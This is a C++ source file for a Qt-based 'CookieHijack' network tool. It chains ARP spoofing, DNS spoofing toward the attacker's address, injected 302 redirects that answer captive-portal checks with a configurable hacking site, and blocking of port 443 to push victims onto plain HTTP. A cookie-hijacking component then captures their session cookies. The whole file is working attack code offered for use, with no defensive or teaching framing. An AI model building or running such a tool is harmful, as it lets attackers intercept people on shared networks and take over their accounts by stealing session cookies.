#include "cookiehijack.h"

CookieHijack::CookieHijack(QObject* parent) : GGraph(parent) {
	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlock_, &GDnsBlock::block, Qt::DirectConnection);

	// 40 : minimum value of ip header size + tcp header size
	find_.findItems_.push_back(new GFindItem(this, 40, -1, 1, "GET /generate_204 HTTP/1."));

	tcpBlock_.backwardBlockType_ = GTcpBlock::Fin;
	// tcpBlock_.backwardFinMsg_ // set in doOpen

	cookieHijack_.tcpFlowMgr_ = &tcpFlowMgr_;

	bpFilter_.filter_ = "tcp port 443";

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &find_, &GFind::find, Qt::DirectConnection);
	QObject::connect(&find_, &GFind::found, &tcpBlock_, &GTcpBlock::block, Qt::DirectConnection);

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &dnsBlock_, &GDnsBlock::block, Qt::DirectConnection);

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &tcpFlowMgr_, &GTcpFlowMgr::manage, Qt::DirectConnection);
	QObject::connect(&tcpFlowMgr_, &GTcpFlowMgr::managed, &cookieHijack_, &GCookieHijack::hijack, Qt::DirectConnection);

	QObject::connect(&autoArpSpoof_, &GAutoArpSpoof::captured, &bpFilter_, &GBpFilter::filter, Qt::DirectConnection);
	QObject::connect(&bpFilter_, &GBpFilter::filtered, &block_, &GBlock::block, Qt::DirectConnection);

	nodes_.append(&autoArpSpoof_);
	nodes_.append(&find_);
	nodes_.append(&tcpBlock_);
	nodes_.append(&dnsBlock_);
	nodes_.append(&tcpFlowMgr_);
	nodes_.append(&cookieHijack_);
	nodes_.append(&bpFilter_);
	nodes_.append(&block_);
}

CookieHijack::~CookieHijack() {
	close();
}

bool CookieHijack::doOpen() {
	QString intfName = autoArpSpoof_.intfName_;
	tcpBlock_.writer_.intfName_ = intfName;
	dnsBlock_.writer_.intfName_ = intfName;

	bool res = GGraph::doOpen();
	if (!res) return false;

	QStringList http;
	http += "HTTP/1.1 302 Redirect";
	http += QString("Location: http://%1.%2").arg(prefix_).arg(hackingSite_);
	http += "";
	http += "";
	tcpBlock_.backwardFinMsg_ = http;

	dnsBlock_.dnsBlockItems_.clear();
	dnsBlock_.dnsBlockItems_.push_back(new GDnsBlockItem(this, prefix_ + ".*", QString(autoArpSpoof_.intf()->ip())));

	return true;
}

bool CookieHijack::doClose() {
	bool res = GGraph::doClose();

	return res;
}

void CookieHijack::propLoad(QJsonObject jo) {
	GProp::propLoad(jo);
}

void CookieHijack::propSave(QJsonObject& jo) {
	GProp::propSave(jo);
}
